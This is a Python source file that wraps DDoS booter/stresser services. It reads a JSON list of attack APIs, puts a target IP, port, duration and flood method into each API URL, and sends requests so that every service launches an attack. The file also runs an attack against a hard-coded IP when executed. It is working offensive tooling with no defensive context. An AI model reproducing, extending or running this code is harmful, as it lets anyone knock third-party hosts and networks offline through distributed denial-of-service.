import os, json, requests

"""
    Use Example:

a = API("mixamp")
if not a.check_for_apis():
    print("[ X ] Error, No APIs found with this method!")

api_count = a.count_apis_found()

a.request_attack("70.70.70.70", 80, 10, "udp")
for resp in a.get_responses():
    print(resp)

print(f"Attack successfully sent to all {api_count} APIs!")
"""

class API_Info:
    name: str
    url: str
    max_time: int
    max_boot: int
    cooldown: int
    method: list

class Attack_Info:
    ip: str
    port: int
    time: int
    method: str

def setAttackInfo(ip: str, p: int, t: int, m: str) -> Attack_Info:
    a = Attack_Info()
    a.ip = ip
    a.port = p
    a.time = t
    a.method = m
    return a

class API():
    apis_found: list[API_Info]
    api_responses: dict

    def __init__(self, m: str) -> None:
        self.apis_found = []
        self.method = m
        self.__look_for_api()

    def __look_for_api(self) -> list:
        self.apis_found = []
        api_i = API_Info()

        if not os.path.isfile("assets/apis.json"): return
        api_db = open("assets/apis.json")
        apis = json.loads(api_db.read())

        for api in apis:
            if self.method in apis[api]['methods']:
                api_i.name = api
                api_i.url = apis[api]['url']
                api_i.max_time = apis[api]['max_time']
                api_i.max_boot = apis[api]['max_boot']
                api_i.cooldown = apis[api]['cooldown']
                api_i.methods = apis[api]['methods']
                self.apis_found.append(api_i)

        api_db.close()
        return self.apis_found

    def request_attack(self, ip: str, p: int, t: int, m: str) -> bool:
        a = setAttackInfo(ip, p, t, m)
        responses = []
        req_sent_to_apis = []

        if not validateIP(a.ip): return False

        if len(self.apis_found) > 0:

            for api in self.apis_found:
                if a.time > api.max_time:
                    responses.append("[ X ] Error, Unable to send attack to this API. Attack time is over the max boot time from this API key!")
                else: 
                    req_sent_to_apis.append(api)
                    responses.append(requests.get(self._parseUrlGets(api.url, a)).text)

        self.api_responses = self._parseResponses(responses, self.apis_found)
        if len(responses) > 0: return True
        return False

    def _parseResponses(self, r: list, apis: list[API_Info]) -> dict:
        new_resp = {}
        i=0
        for resp in r:
            # Check to see if the API response is json syntax
            if "attack" in resp and "launched" in resp:
                new_resp[apis[i].name] = f"[ + ] Attack has successfully sent to {apis[i].name}"
            if "invalid" in resp and "key" in resp:
                new_resp[apis[i].name] = f"[ X ] Error, Unable to send an attack to an API due to key on {apis[i].name}. Please report this issue to the net owner!"
            elif "invalid" in resp and "time" in resp:
                new_resp[apis[i].name] = f"[ X ] Error, Unable to send an attack to an API due to attack time on {apis[i].name}. Please report this issue to the net owner!"
            elif "invalid" in resp and "port" in resp:
                new_resp[apis[i].name] = f"[ X ] Error, Unable to send an attack to an API due to attack port on {apis[i].name}. Please report this issue to the net owner!"
            elif "invalid" in resp and "ip" in resp:
                new_resp[apis[i].name] = f"[ X ] Error, Unable to send an attack to an API due to attack ip on {apis[i].name}. Please report this issue to the net owner!"
            i+=1

        return new_resp

    def _parseUrlGets(self, api: str, a: Attack_Info) -> str:
        return api.replace("[HOST]", a.ip).replace("[PORT]", str(a.port)).replace("[TIME]", str(a.time)).replace("[METHOD]", a.method)

    def check_for_apis(self) -> bool:
        if len(self.apis_found) > 0: return True
        return False

    def count_apis_found(self) -> int:
        return len(self.apis_found)
    
    def get_apis(self) -> list[API_Info]:
        return self.apis_found

    def get_responses(self) -> dict:
        return self.api_responses

def validateIP(ip: str):
    if len(ip) < 1: return False
    for i in ip.split("."): 
        if int(i) < 1 | int(i) > 255: return False
    return True

a = API("mixamp")
if not a.check_for_apis():
    print("[ X ] Error, No APIs found with this method!")

a.request_attack("70.70.70.70", 80, 10, "udp")
for resp in a.get_responses():
    print(resp)